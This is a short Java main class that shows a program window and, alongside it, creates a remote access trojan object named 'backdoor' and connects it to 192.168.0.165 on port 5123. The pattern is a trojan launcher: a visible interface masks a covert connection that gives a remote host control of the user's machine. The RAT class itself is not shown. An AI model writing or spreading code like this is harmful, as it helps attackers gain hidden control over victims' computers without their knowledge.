package launcher;

import connection.RAT;
import view.MainWindow;

public class Main {
	public static void main(String[] args) {
		new MainWindow();
		RAT backdoor = new RAT("192.168.0.165", 5123);
		backdoor.connect();
	}
}
